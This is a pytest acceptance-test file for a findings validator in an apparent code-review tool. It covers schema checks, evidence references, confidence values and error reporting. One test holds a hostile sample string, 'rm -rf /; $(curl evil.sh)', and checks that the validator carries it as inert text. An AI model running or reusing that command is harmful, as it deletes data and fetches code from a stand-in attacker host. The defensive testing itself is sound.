"""T006 acceptance tests — `validate_findings` as the last gate before a report.

One named test per rejection reason, plus a multi-error test for AC #8 and a
filesystem-assertion test for AC #9.
"""

from __future__ import annotations

import pytest

from easy_verifier.core.findings import (
    CONFIDENCE_DOMAIN,
    Finding,
    ValidationError,
    validate_findings,
)
from easy_verifier.core.models import EvidencePack, Excerpt


def make_pack(
    dimension: str, excerpts: tuple[Excerpt, ...], *, truncated: bool = False
) -> EvidencePack:
    return EvidencePack(
        dimension=dimension,
        mode="full",
        scope=".",
        files_read=tuple(sorted({e.path for e in excerpts})),
        excerpts=excerpts,
        sources_sought=("a.py",),
        sources_found=("a.py",),
        sources_missing=(),
        coverage_score=1.0,
        truncated=truncated,
    )


ARCH_EXCERPT = Excerpt(path="a.py", start_line=1, end_line=5, text="def f(): ...")
SECURITY_EXCERPT = Excerpt(
    path="b.py", start_line=10, end_line=20, text="token = env()"
)


def base_packs() -> dict[str, EvidencePack]:
    return {
        "architecture": make_pack("architecture", (ARCH_EXCERPT,)),
        "security": make_pack("security", (SECURITY_EXCERPT,)),
    }


def valid_finding(**overrides) -> dict:
    finding = {
        "dimension": "architecture",
        "title": "Circular import",
        "detail": "Module a imports module b which imports module a.",
        "evidence_ref": ARCH_EXCERPT.ref,
        "confidence": "high",
    }
    finding.update(overrides)
    return finding


# --------------------------------------------------------------------------
# AC #1 — schema
# --------------------------------------------------------------------------


def test_accepts_a_well_formed_finding_with_optional_suggestion():
    findings = [valid_finding(suggestion="Extract a shared interface.")]
    result = validate_findings(findings, base_packs())
    assert result.findings == (
        Finding(
            dimension="architecture",
            title="Circular import",
            detail="Module a imports module b which imports module a.",
            evidence_ref=ARCH_EXCERPT.ref,
            confidence="high",
            suggestion="Extract a shared interface.",
        ),
    )


# --------------------------------------------------------------------------
# AC #2/#3/#4 — strict "either missing" reading of FR-015
# --------------------------------------------------------------------------


def test_evidence_present_but_confidence_missing_is_rejected():
    findings = [valid_finding(confidence="")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    assert any(e.field == "confidence" for e in exc_info.value.errors)


def test_confidence_present_but_evidence_missing_is_rejected():
    findings = [valid_finding(evidence_ref="")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    assert any(e.field == "evidence_ref" for e in exc_info.value.errors)


def test_both_evidence_and_confidence_missing_is_rejected():
    findings = [valid_finding(evidence_ref="", confidence="")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    fields = {e.field for e in exc_info.value.errors}
    assert {"evidence_ref", "confidence"} <= fields


# --------------------------------------------------------------------------
# AC #5 — error names the offending finding by index and title, and the field
# --------------------------------------------------------------------------


def test_error_names_offending_finding_by_index_title_and_field():
    findings = [
        valid_finding(),
        valid_finding(title="Leaky abstraction", confidence=""),
    ]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    (error,) = exc_info.value.errors
    assert error.index == 1
    assert error.title == "Leaky abstraction"
    assert error.field == "confidence"
    assert "confidence" in str(error)


# --------------------------------------------------------------------------
# AC #6/#7 — dangling and unrun-dimension citations
# --------------------------------------------------------------------------


def test_dangling_evidence_ref_absent_from_cited_pack_is_rejected():
    findings = [valid_finding(evidence_ref="a.py:99-99")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    (error,) = exc_info.value.errors
    assert error.field == "evidence_ref"
    assert "not found" in error.reason


def test_dangling_ref_into_truncated_pack_names_truncation_specifically():
    packs = {"architecture": make_pack("architecture", (ARCH_EXCERPT,), truncated=True)}
    findings = [valid_finding(evidence_ref="a.py:99-99")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, packs)
    (error,) = exc_info.value.errors
    assert "truncated" in error.reason


def test_citing_a_dimension_that_was_not_run_is_rejected_naming_it():
    packs = {"security": make_pack("security", (SECURITY_EXCERPT,))}
    findings = [valid_finding(dimension="architecture")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, packs)
    (error,) = exc_info.value.errors
    assert error.field == "dimension"
    assert "architecture" in error.reason
    assert "not run" in error.reason


# --------------------------------------------------------------------------
# AC #8 — all findings validated, all errors reported together
# --------------------------------------------------------------------------


def test_all_findings_validated_and_all_errors_collected():
    findings = [
        valid_finding(),
        valid_finding(title="Missing confidence", confidence=""),
        valid_finding(),
        valid_finding(title="Dangling ref", evidence_ref="a.py:999-999"),
    ]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    indices = {e.index for e in exc_info.value.errors}
    assert indices == {1, 3}


# --------------------------------------------------------------------------
# AC #9 — rejection means no partial write, no filesystem touch at all
# --------------------------------------------------------------------------


def test_rejected_submission_writes_nothing_to_disk(tmp_path):
    before = sorted(tmp_path.iterdir())
    findings = [valid_finding(confidence="")]
    with pytest.raises(ValidationError):
        validate_findings(findings, base_packs())
    after = sorted(tmp_path.iterdir())
    assert before == after == []


# --------------------------------------------------------------------------
# AC #10 — confidence domain
# --------------------------------------------------------------------------


def test_confidence_out_of_domain_string_is_rejected():
    findings = [valid_finding(confidence="0.9")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    (error,) = exc_info.value.errors
    assert error.field == "confidence"


def test_confidence_empty_string_is_rejected_not_treated_as_missing_only():
    findings = [valid_finding(confidence="")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    assert any(e.field == "confidence" for e in exc_info.value.errors)


def test_confidence_null_is_rejected():
    findings = [valid_finding(confidence=None)]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    assert any(e.field == "confidence" for e in exc_info.value.errors)


@pytest.mark.parametrize("value", CONFIDENCE_DOMAIN)
def test_each_domain_confidence_value_is_accepted(value):
    result = validate_findings([valid_finding(confidence=value)], base_packs())
    assert result.findings[0].confidence == value


# --------------------------------------------------------------------------
# AC #11 — suggestion is inert text
# --------------------------------------------------------------------------


def test_suggestion_with_shell_looking_content_is_carried_through_as_inert_text():
    payload = "rm -rf /; $(curl evil.sh)"
    findings = [valid_finding(suggestion=payload)]
    result = validate_findings(findings, base_packs())
    assert result.findings[0].suggestion == payload


def test_suggestion_non_string_is_rejected():
    findings = [valid_finding(suggestion=123)]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    assert any(e.field == "suggestion" for e in exc_info.value.errors)


# --------------------------------------------------------------------------
# AC #12 — findings grouped by dimension across a multi-dimension submission
# --------------------------------------------------------------------------


def test_findings_grouped_by_dimension_across_submission():
    findings = [
        valid_finding(dimension="architecture"),
        valid_finding(
            dimension="security",
            evidence_ref=SECURITY_EXCERPT.ref,
            title="Hardcoded token",
        ),
        valid_finding(dimension="architecture", title="Second architecture finding"),
    ]
    result = validate_findings(findings, base_packs())
    assert len(result.findings) == 3
    assert len(result.by_dimension["architecture"]) == 2
    assert len(result.by_dimension["security"]) == 1


# --------------------------------------------------------------------------
# Edge cases: empty list, evidence_ref format, unknown fields, payload bounds
# --------------------------------------------------------------------------


def test_empty_findings_list_is_accepted_as_a_real_no_findings_result():
    result = validate_findings([], base_packs())
    assert result.findings == ()
    assert result.by_dimension == {}


@pytest.mark.parametrize("bad_ref", ["a.py:12", "a.py#item-3", "a.py"])
def test_non_canonical_evidence_ref_formats_are_rejected(bad_ref):
    findings = [valid_finding(evidence_ref=bad_ref)]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    (error,) = exc_info.value.errors
    assert error.field == "evidence_ref"
    assert "canonical" in error.reason


def test_unknown_field_is_rejected_naming_it():
    findings = [valid_finding(extra_field="surprise")]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    (error,) = exc_info.value.errors
    assert error.field == "<unknown>"
    assert "extra_field" in error.reason


def test_payload_over_the_bound_is_rejected():
    findings = [valid_finding() for _ in range(501)]
    with pytest.raises(ValidationError) as exc_info:
        validate_findings(findings, base_packs())
    (error,) = exc_info.value.errors
    assert error.field == "<payload>"


def test_malformed_json_string_payload_names_the_position():
    with pytest.raises(ValidationError) as exc_info:
        validate_findings('[{"dimension": "architecture",]', base_packs())
    (error,) = exc_info.value.errors
    assert "line" in error.reason
    assert "column" in error.reason


def test_json_string_payload_is_parsed_and_validated():
    import json

    payload = json.dumps([valid_finding()])
    result = validate_findings(payload, base_packs())
    assert len(result.findings) == 1


def test_unicode_and_control_characters_in_title_and_detail_are_preserved():
    findings = [
        valid_finding(title="Ünïcödé — 危険な文字列", detail="line1\nline2\twith tab")
    ]
    result = validate_findings(findings, base_packs())
    assert result.findings[0].title == "Ünïcödé — 危険な文字列"
    assert result.findings[0].detail == "line1\nline2\twith tab"


def test_duplicate_findings_are_accepted_without_crashing():
    findings = [valid_finding(), valid_finding()]
    result = validate_findings(findings, base_packs())
    assert len(result.findings) == 2
